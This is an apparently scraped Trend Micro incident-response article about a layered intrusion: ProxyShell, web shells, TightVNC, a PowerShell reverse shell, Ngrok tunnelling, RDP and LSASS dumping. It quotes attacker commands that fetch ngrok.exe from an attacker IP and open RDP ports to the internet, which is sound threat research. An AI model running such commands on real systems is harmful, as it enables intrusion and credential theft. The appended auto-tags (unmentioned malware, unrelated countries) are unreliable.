# Defending Systems Against Attacks With Layers of Remote Control
### The Trend Micro™ Managed XDR team addressed a stealthy multilayered attack that progressed from an exploited endpoint vulnerability to the use of legitimate remote access tools including Remote Desktop Protocol (RDP) as its final means of intrusion. 

## Information:
+ Source: Trend Micro
+ Link: https://www.trendmicro.com/en_us/research/22/a/defending-systems-against-attacks-with-layers-of-remote-control.html
+ Date: 2022-01-10
+ Author: None


## Article:
![Article Image](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/remote-control-layers-main.jpg)





As organizations brace themselves for the year ahead, now is an opportune time to take stock of how they can strengthen their security posture and shore up their defenses. While organizations may have the power of leading-edge cybersecurity solutions on their side, malicious actors continue to work diligently to refine their methods and take advantage of vulnerabilities every chance they get. A proactive mindset, therefore, is key.


The team behind the Trend Micro™ Managed XDR (MDR) solution recently addressed an incident encountered by one of Trend Micro’s customers. It showed how a malicious actor launched a stealthy multilayered attack that first exploited an endpoint vulnerability as a path for lateral movement. From installing a web shell in the compromised cloud server via a ProxyShell exploit, the persistent attack progressed to the use of legitimate remote access tools including Remote Desktop Protocol (RDP) as its final means of intrusion.


The incident also demonstrated how crucial it is for security teams to adopt an integrated approach to threat detection, monitoring, and response in handling threats swiftly, especially now that remote work arrangements have become common for enterprises because of the Covid-19 pandemic.


Initial investigation
=====================


We first saw malware in an endpoint that the product quarantined. While traditional endpoint protection platforms (EPPs) would stop at this stage, MDR took the context of the detection into consideration. The detection was a web shell malware identified as Possible\_SMWEBSHELLYXBH5A, which was found on a Microsoft Exchange server. This signified a high likelihood that the server was compromised through a vulnerability. In this case, the exploit most likely involved three ProxyShell vulnerabilities: CVE-2021-31207, CVE-2021-34473, and CVE-2021-34523. This prompted the team to activate incident response mode and alert the customer involved.


**First layer of remote control: web shell**


Upon further scrutiny, we found multiple suspected web shell files, which could provide an attacker a means to gain remote control of an endpoint, from the server.






![The initial log of events](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/fig1-remotecontrol.png)
Figure 1. The initial log of events





Progressive root cause analysis (PRCA) made possible by Trend Micro Vision One™ enabled us to trace the creation of the web shell files to a legitimate Exchange software binary, MSExchangeMailboxReplication.exe.






![The detection of web shell files](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/fig2-remotecontrol.png)
Figure 2. The detection of web shell files




TightVNC can be used legitimately, the context of the file location’s being an Exchange server raised suspicions Our findings confirmed that the malicious actor indeed used a ProxyShell exploit.


**Second layer of remote control: use of legitimate tool TightVNC**


MDR found the legitimate remote access tool [TightVNC](https://www.tightvnc.com/) in the endpoint. While as this application is not usually found within this context. The customer confirmed that TightVNC was not expected to be part of the environment, so we requested the customer to uninstall it.


Subsequent monitoring and use of PRCA allowed us to trace the reemergence of TightVNC as the file was reinstalled through yet another layer of remote control.


**Third layer of remote control: backdoor PowerShell script**






![The detection of the PowerShell script](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/fig3-remotecontrol.png)
Figure 3. The detection of the PowerShell script




Undeterred, the malicious actor created and executed a PowerShell script that we observed as C:\Windows\System32\AppLocker\winServicePrinter.ps1 (detected as Backdoor.PS1.REVSHELL.AB), which was a reverse shell. Its executed routines included the following:


- Reinstallation and execution of TightVNC


curl http://www.tightvnc.com/download/2.8.59/tightvnc-2.8.59-gpl-setup-64bit.msi -o tight.msi


cmd /c start msiexec /i tight.msi /quiet


cd ../..


cd "program files"


cd tightvnc


- Downloading and execution of Ngrok (our report titled [“Analysis of a Convoluted Attack Chain Involving Ngrok”](/en_us/research/20/i/analysis-of-a-convoluted-attack-chain-involving-ngrok.html) provides a thorough discussion)  




curl http://31.214.157.169[:]80/ngrok.exe -o


"C:\Windows\system32\ngrok.exe" tcp 3389


"C:\Windows\system32\ngrok.exe" tcp 443






![The detection of Ngrok](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/fig4-remotecontrol.png)
Figure 4. The detection of Ngrok




Further investigation revealed that the auth\_token used by Ngrok originated from the email address excizewn[@]gmail[.]com. This was most likely a dummy account that could be discarded as necessary.


Ngrok was used to open ports 3389 and 443 to the internet via the Ngrok servers. This brought us to the fourth and final layer of remote control.


**Fourth layer of remote control: RDP**


Lastly, the malicious actor resorted to RDP, which is a legitimate remote control tool that is built into Microsoft Windows. RDP provides an interface that lets end users connect to another computer over a network connection. RDP has long been abused by malicious actors to exfiltrate data as part of attacks to steal information that can be sold in the [underground](https://www.trendmicro.com/vinfo/tmr/?/us/security/threat-intelligence-center/deep-web/), enabling cybercriminals to integrate hijacked systems into [networks of bots](/en_us/research/21/c/emotet-one-month-after-the-takedown.html) to carry out more serious incursions. (Incident reports of RDP abuse for stealing data can be found [here](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/vulnerabilities-and-exploits/infosec-guide-remote-desktop-protocol-rdp) and [here](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/nefilim-ransomware-threatens-to-expose-stolen-data).)


As many organizations have adopted hybrid work models enabled by remote work connection, the use of RDP has become more common, which has resulted in many IT teams’ considering RDP traffic as normal and harmless. However, this likely misconception makes RDP an attack vector for malicious actors trying to dodge detection. Unless one keeps a watchful eye on the telemetry, the likelihood is high for security teams to gloss over this event because it can be construed as ordinary interaction between two users connected to the same system.


Trend Micro MDR telemetry comprises data collected by the solution across all security layers, including but not limited to email, endpoint, server, cloud workload, and network. The MDR platform collects a wide variety of telemetry data from each security layer to detect unknown threats and facilitate root cause analysis.


At the final layer, the only evidence that RDP was indeed used was the following section of the telemetry.






![MDR telemetry](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/fig5-remotecontrol.png)
Figure 5. MDR telemetry




Note the instance of rdpclip process execution in the machine prior to the dumping of lsass.exe. RDP Clip is a legitimate Windows file that monitors and manages the shared clipboard between the local computer and the remote desktop that the user is controlling from another location. The goal for this endpoint was credential dumping with the purpose of lateral movement.






![Credential dumping from LSASS process memory](https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/uncovering-and-defending-systems-against-attacks-with-layers-of-remote-control/fig6-remotecontrol.png)
Figure 6. Credential dumping from LSASS process memory




Fortunately, we were able to provide the customer with timely alert and intervention from the moment the initial intrusion via the cloud server was observed all the way to guidance during the cleanup and remediation process.


Insights from the threat report and the threat handling perspective


Incidents such as this provide security teams opportunities to see attacks from different angles and in a big-picture manner. We discuss key insights below that organizations can consider when adopting a proactive cybersecurity approach to ensure utmost protection of their systems.   


**On detecting and responding to the web shell**


MDR discovered a number of Possible\_Webshell detections. The names of the detected files were random and they were placed in the directory where server scripts are usually found in Internet Information Services (IIS) instances. (Created by Microsoft, IIS is an extensible web server software used with the Windows NT family.) This instantly made it interesting because, first, it did not look like a test and, second, the numerous files detected with the random names could mean that there was an attacker attempting to place a number of web shells on the server. Later, we noticed web shell activity indicating that the malicious actor successfully planted at least one web shell that they were able to access.


**On TightVNC and Ngrok**


TightVNC and Ngrok are both legitimate applications that have been abused by malicious actors for their nefarious ends. Relying solely on EPP detection can impair a security team’s ability to perceive the presence of such abused tools as red flags for serious attacks. MDR automatically collects and correlates data across multiple layers of security, thus significantly enhancing the speed of threat detection, investigation, and response. In this case, MDR’s integrated approach provided the context that helped the security analysts correlate the chain of events for accurate threat assessment and adequate response.


From the attacker’s point of view, the external-facing vulnerable server gave them a path into the environment. To solidify their foothold and carry out their objective, they used TightVNC and Ngrok as means to remotely control endpoints. At this stage, they had the web shell-infested server, a normal remote tool (that the EPP would not be able to detect), and a tunneling application (that the EPP would also not be able to detect). 


Conclusion


Organizations can learn many lessons from this incident. One is that organizations cannot depend on EPP alone to thwart persistent threats because it is incapable of providing a holistic view necessary for early detection, investigation, and response. As we have seen, the series of attacks in this case used stealthy means to intrude into the system, including seemingly innocuous tools across several security layers. The complexity of the attacks made it extra challenging for the security team and threat researchers to analyze the chain of events and arrive at a clear contextual understanding of the threat scenario at hand.


Another key takeaway, one that has gained more relevance now that the pandemic has pushed enterprises to adopt remote work setups, is that even the most benign of tools, such as RDP, can be a threat vector as malicious actors always strive to outsmart the good guys through creative tricks.


Adequate response, and not just time, is of the essence in containing the impact and minimizing the scope and severity of an attack. 


Trend Micro Vision One™ with Managed XDR
========================================


[Trend Micro Vision OneTM with Managed XDR](/en_us/business/services/managed-xdr.html) is a purpose-built platform that goes beyond traditional XDR solutions. Data collected and analyzed in silos impairs visibility as serious threats can evade detection. Vision One lets security teams see more, respond faster, and achieve greater security by providing a clear contextual view of threats across more threat vectors. It allows security teams and threat analysts to connect more dots into a holistic view, simplifying the steps toward achieving an attack-centric view of an entire chain of events, so organizations can take action all from one place. For more information, read the [Vision One solution brief](/en_us/business/products/vision-one.html). 








## Tags:

#### Action:
[[action.malware.name=at]] [[action.malware.name=at]] [[action.malware.name=cmd]] [[action.malware.name=cmd]] [[action.malware.name=Conti]] [[action.malware.name=Net]] [[action.malware.name=Ngrok]] [[action.malware.name=njRAT]] [[action.malware.name=P.A.S. Webshell]] [[action.malware.name=Ping]] [[action.malware.name=Ping]] [[action.malware.name=PS1]] [[action.malware.name=PS1]] [[action.malware.name=Tor]]

#### Industry:
[[victim.industry.name=Accomodation]]

#### Location:
[[victim.country.name=Mali]] [[victim.continent.name=Africa]] [[victim.city.name=Dili]] [[victim.country.name=East Timor]] [[victim.continent.name=Asia]] [[victim.city.name=]] [[victim.country.name=Haiti]] [[victim.continent.name=North and Central America]]

### Autogenerated Tags:
[[Rdp]] [[Tightvnc]] [[Mdr]] [[Ngrok]] [[Teams]] [[Xdr]] [[Epp]] [[Cloud]] [[Proxyshell]] [[Microsoft]] [[Trend Micro]]
#### ipv4-adresses
31.214.157.169
#### urls
http://www.tightvnc.com/download/2.8.59/tightvnc-2.8.59-gpl-setup-64bit.msi http://31.214.157.169:80/ngrok.exe
#### CVE's
[[CVE-2021-31207]] [[CVE-2021-34473]] [[CVE-2021-34523]]

